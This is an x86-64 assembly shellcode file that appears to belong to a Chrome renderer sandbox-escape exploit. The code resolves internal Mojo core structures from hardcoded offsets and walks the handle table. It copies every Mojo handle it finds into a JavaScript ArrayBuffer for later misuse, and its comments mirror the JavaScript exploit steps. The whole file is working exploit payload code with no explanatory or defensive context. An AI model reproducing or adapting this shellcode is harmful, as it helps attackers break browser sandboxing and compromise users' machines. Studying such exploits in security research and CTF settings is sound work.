bits 64

SECTION .TEXT
	GLOBAL _start

_start:
    push rsi
    push rcx
    push rdi

    xor rbx, rbx
    mov rax, r14

    ; Get ArrayBuffer backing
    mov rdi, [rax+0x10]
    mov rdi, [rdi]

    ; Get xsktFreeLocale
    mov rax, [rax+0x18]
    mov rax, [rax]
    mov rax, [rax]

    ; let MojoGetTimeTicksNowImpl = val2 + 0xa4e040n;
    ; let g_core_ptr_ptr = MojoGetTimeTicksNowImpl + 0x6ff23e5n + 0xbn;
    add rax, 0xa4e040
    add rax, 0x6ff23e5
    add rax, 0xb

    mov rax, [rax]
    ; let handle_table_ptr = g_core_ptr + 0x40n;
    add rax, 0x40
    ; let handle_table = await ptrAt(handle_table_ptr);
    mov rax, [rax]
    ; let map_handles_ptr = handle_table + 0x18n;
    add rax, 0x18

    mov rsi, rdi
    add rsi, 0x800
loop:
    ; let map_handles     = await ptrAt(map_handles_ptr);
    mov rax, [rax]
    test rax, rax
    je done

    ; Count the amount of entries
    inc rbx

    ; handle = await ptrAt(map_handles + 0x08n);
    mov rcx, rax
    add rcx, 8
    mov rcx, [rcx]

    ; Write out a handle to the backing ArrayBuffer
    mov [rsi+rbx*8], rcx

    jmp loop
done:
    mov rsi, rdi
    add rsi, 0x800
    mov [rsi], rbx

    pop rdi
    pop rcx
    pop rsi
    ret
